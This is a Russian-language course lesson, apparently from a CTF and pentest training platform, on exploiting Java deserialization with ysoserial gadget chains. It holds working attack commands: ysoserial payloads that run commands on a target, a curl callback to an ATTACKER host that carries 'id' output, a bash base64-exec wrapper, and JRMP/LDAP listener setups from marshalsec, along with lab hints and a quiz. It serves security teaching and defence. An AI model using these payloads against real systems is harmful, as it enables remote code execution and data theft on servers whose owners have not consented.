---
id: web-java-deser-chains
title: "Java deserialization gadget chains (ysoserial)"
category: web
parent: web-deser-expert
difficulty: expert
order: 1
tags: [java, deserialization, ysoserial, gadget, rce]
prerequisites: [web-deserialization]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 48
summary: "Java deserialization: как работают gadget chains, выбор по classpath, генерация ysoserial и эксплуатация RCE."
lab:
  kind: shell
  title: 'Практика: Java gadget chain (ysoserial)'
  toolset: [core, java, curl]
  workdir: /home/student/task
  files: [task.md, session.txt]
  check: 'grep -q ''nto{'' found.txt'
  hints:
    - 'Подтверди формат: `base64 -d session.txt | xxd | head -1` — ждём `aced 0005`.'
    - 'Собери payload: `java -jar ysoserial.jar CommonsCollections6 ''cat /flag'' -o payload.ser`.'
    - 'Отправь сериализованный объект: `curl -s http://erp.example/ --data-binary @payload.ser`.'
    - 'Запиши ответ в found.txt и набери `check`.'
---

## Вопрос, с которого всё начинается

Мы разобрали десериализацию в четырёх языках. Java — самый «дорогой» случай: одна уязвимая точка даёт RCE уровня сервера, но чтобы её проэксплуатировать, нужно подобрать **gadget chain** — цепочку классов, которая приведёт к выполнению команды, **зная, какие библиотеки есть в приложении**.

Вопрос: как, не имея исходников, понять, какая цепочка сработает, и собрать payload? Разберём это на одном примере — приложении, которое отдаёт сериализованный Java-объект в cookie.

## Наш пример

Есть Java-приложение `erp.example`. Оно отдаёт cookie с base64-значением:

```bash
$ curl -si https://erp.example/login -d 'user=bob&pass=...' | grep -i set-cookie
Set-Cookie: session=rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ...
```

Декодируем:

```bash
$ echo 'rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ...' | base64 -d | xxd | head -1
00000000: aced 0005 7372 0017 6a61 7661 2e75 7469  ....sr..java.uti
```

Первые байты `AC ED 00 05` — **магические байты Java-сериализации** (в base64 они дают префикс `rO0AB`). Дальше `java.util.PriorityQueue` — имя класса. Значит, сервер десериализует `ObjectInputStream.readObject()` на нашем значении. Это потенциальный RCE.

## Шаг 1: как работает gadget chain

Java-сериализация восстанавливает объекты и вызывает их методы — `readObject`, `readResolve`, `hashCode`, `toString`, `equals`. **Gadget chain** — это цепочка классов, где побочный эффект одного метода вызывает следующий, пока не дойдём до sink (места, которое запускает команду: `Runtime.exec`, `ProcessBuilder`, JNDI lookup, запись файла).

Главные семейства:

- **CommonsCollections1-7** (Apache Commons Collections) — самая распространённая;
- **CommonsBeanutils1** — часто присутствует, не требует Commons Collections;
- **Spring1/Spring2** — Spring Framework;
- **Groovy1** — Groovy;
- **JRMPClient/JRMPListener** — сетевые, без локальной цепочки в payload;
- **URLDNS** — детект без RCE.

Условие работы — соответствующие библиотеки в classpath. Если цепочка не подходит, десериализация падает с `ClassNotFoundException`/`InvalidClassException` — и это само по себе полезный сигнал.

## Шаг 2: сначала безопасный детект

Прежде чем строить RCE, подтвердим, что десериализация вообще происходит, и не уроним сервис. Цепочка `URLDNS` не требует сторонних библиотек: она лишь заставляет JVM сделать DNS-запрос, который видно на твоём listener'е.

```bash
$ java -jar ysoserial.jar URLDNS "http://unique.abc123.oast.pro" | base64 -w0
$ curl -s https://erp.example/ -H "Cookie: session=$(java -jar ysoserial.jar URLDNS 'http://unique.abc123.oast.pro' | base64 -w0)"
# на interactsh:
# [unique.abc123.oast.pro] Received DNS interaction from 203.0.113.9
```

Пришёл DNS — десериализация подтверждена, и мы ничего не сломали. Это правильный первый шаг для любой Java-deser точки.

## Шаг 3: определяем classpath

Теперь нужно понять, какие библиотеки загружены, чтобы выбрать рабочую цепочку. Варианты:

```bash
# по исходникам/архиву приложения
$ unzip -l app.war | grep -iE 'commons-collections|commons-beanutils|spring|groovy|hibernate'
# по каналу ошибок — «прощупывание» доступных классов
$ java -jar GadgetProbe.jar --url https://erp.example/deser --wordlist gadgets.txt
```

`GadgetProbe` отправляет сериализованные объекты-пробы и смотрит на разницу ошибок (`ClassNotFoundException` против `InvalidClassException`) — так подбирают цепочку, не имея исходников. По зависимостям (`pom.xml`, `WEB-INF/lib`, версии в баннерах) — тоже.

## Шаг 4: матрица выбора цепочки

| Библиотека в classpath | Цепочка | Ограничение |
|------------------------|---------|-------------|
| Commons Collections 3.1-3.2.1 | `CommonsCollections6` | нужен CC |
| Commons Collections 4.0 | `CommonsCollections2/4` | нужен CC4 |
| commons-beanutils | `CommonsBeanutils1` | часто в Spring-стеке |
| Spring Core | `Spring1/Spring2` | версия Spring |
| Groovy | `Groovy1` | `MethodClosure` |
| Только старый JDK | `Jdk7u21` | JDK ≤ 7u21 |
| Ничего локально | `JRMPClient` + marshalsec | нужен исходящий RMI |

Правило: начинай с `CommonsCollections6` (работает на большинстве JDK 8 и требует только CC3), затем `CommonsBeanutils1` (не требует CC вообще), затем Spring/Groovy. Если ошибки намекают на отсутствие CC — переключайся.

## Шаг 5: генерируем и доставляем

Допустим, в приложении есть Commons Collections 3.2 — берём `CommonsCollections6`:

```bash
$ java -jar ysoserial.jar CommonsCollections6 "curl http://ATTACKER:8080/$(id|base64)" > p.bin
$ python3 -m http.server 8080 &
$ curl -s https://erp.example/ -H "Cookie: session=$(base64 -w0 p.bin)"
# в логе: GET /dWlkPTAocm9vdCkK
```

Пришёл запрос — код выполнен. Важно: sink `exec` **не пишет в HTTP-ответ**, поэтому доказательство всегда через OOB или файл-маркер. Если команда с пробелами/кавычками ломается, оборачивай её в base64:

```bash
$ java -jar ysoserial.jar CommonsCollections6 "bash -c {echo,BASE64}|{base64,-d}|bash" > p.bin
```

## Шаг 6: если локальной цепочки нет

Иногда подходящей библиотеки нет, но открыт JNDI/JRMP-доступ. Тогда поднимаем на своей стороне JRMP-листенер, который отдаёт gadget:

```bash
# на атакующем:
$ java -cp marshalsec.jar marshalsec.jndi.JRMPListener 1099 CommonsCollections6 "id"
# payload, который подключится к нашему листенеру:
$ java -jar ysoserial.jar JRMPClient "10.10.14.7:1099" | base64 -w0
```

Вариант через LDAP — `marshalsec.jndi.LDAPRefServer http://ATTACKER:8000/#Exploit`. Помни: Java 8u121+ ограничивает `trustURLCodebase`, поэтому нужны локальные gadget'ы или обходы. И проверь, нет ли у приложения JNDI-поверхности — иногда `JRMPClient` проще, чем подбор цепочки под незнакомый classpath.

## Шаг 7: обходы и ограничения

- **WAF блокирует `AC ED 00 05`** → gzip/base64, передай payload в другом поле.
- **`ObjectInputFilter` (JEP 290)** — allowlist/blacklist классов; подбирай разрешённую цепочку или обходи через нефильтруемый класс.
- **Версия JDK** влияет на доступность классов (`Jdk7u21` только на старых).
- **Отсутствие вывода** — используй OOB-канал.
- **Разбор чужого blob'а** — `SerializationDumper` печатает дерево классов и показывает, какой `readObject` вызывается первым: это помогает понять, почему цепочка обрывается.
- **Проверка канала ошибок** — `ClassNotFoundException` означает «библиотеки нет», `InvalidClassException` — «есть, но версия класса другая»; по этой разнице `GadgetProbe` и подбирает цепочку.

## Что мы теперь знаем

- Java-сериализацию выдают байты `AC ED 00 05` (base64 `rO0AB`).
- RCE строится из **gadget chain** — цепочки классов, заканчивающейся sink.
- Сначала **URLDNS** для безопасного детекта, потом RCE-цепочка.
- Цепочку выбирают по classpath (CommonsCollections, Beanutils, Spring, Groovy…).
- `ysoserial` генерирует payload; `GadgetProbe` прощупывает классы.
- Sink не пишет в ответ — доказательство через OOB/файл.
- Без подходящей библиотеки — `JRMPClient`/LDAP + marshalsec.

## На что смотреть дальше

- **Сначала детект, потом RCE.** URLDNS подтверждает уязвимость, не роняя приложение.
- **Версия решает.** Номер цепочки (CC1..CC7) и версия JDK определяют, что сработает.
- **WAF видит магические байты** — кодируй/оборачивай payload.
- **`ObjectInputFilter`** может закрыть вектор — проверь, не падает ли с ним цепочка.
- **ASP.NET ViewState** — тот же подход, но инструмент `ysoserial.net` (см. `web-viewstate`).
- **Только с согласия.** RCE меняет состояние прода.

## Квиз

Проверь себя.

```quiz
- question: "Декодированное значение начинается с `AC ED 00 05`. Что это?"
  options:
    - "PHP serialize"
    - "Java-сериализованный объект"
    - "Python pickle"
    - "ZIP"
  answer: 1
  explanation: "Это магические байты Java; в base64 — префикс `rO0AB`."
- question: "Что такое gadget chain в Java?"
  options:
    - "Пароль"
    - "Цепочка классов, чьи методы при десериализации ведут к sink"
    - "Тип cookie"
    - "XML-тег"
  answer: 1
  explanation: "Побочные эффекты методов по цепочке приводят к выполнению команды."
- question: "Зачем использовать URLDNS?"
  options:
    - "Для выполнения команды"
    - "Для безопасного подтверждения десериализации через DNS-запрос"
    - "Для чтения файла"
    - "Для шифрования"
  answer: 1
  explanation: "URLDNS не требует библиотек и лишь инициирует DNS — видно на коллабораторе."
- question: "Что нужно, чтобы цепочка сработала?"
  options:
    - "Только JDK"
    - "Соответствующие библиотеки в classpath"
    - "TLS"
    - "Cookie"
  answer: 1
  explanation: "Иначе `ClassNotFoundException` — это и есть сигнал подобрать другую."
- question: "Почему RCE доказывают через OOB?"
  options:
    - "Это быстрее"
    - "Sink `exec` не пишет вывод в HTTP-ответ — канал слепой"
    - "Так требует WAF"
    - "Так работает base64"
  answer: 1
  explanation: "Вывод команды не попадает в ответ, поэтому нужен внешний признак."
```

## Куда дальше

Дальше мы разберём **ViewState** — тот же класс уязвимости, но в .NET: подписанный blob, который при утечке `machineKey` тоже подделывается до RCE (`web-viewstate`). А пока главное запомни: в Java уязвимость подтверждают **безопасным детектом**, а RCE строят из **классов, уже загруженных в приложение**.

## Где пригодится

- **CTF (Web):** задачи на Java-deser.
- **Bug bounty:** deser RCE — критичный отчёт.
- **Пентест:** аудит Java-приложений, RMI/JMX.
- **Работа (AppSec):** ObjectInputFilter, отказ от Java-сериализации, обновление библиотек.
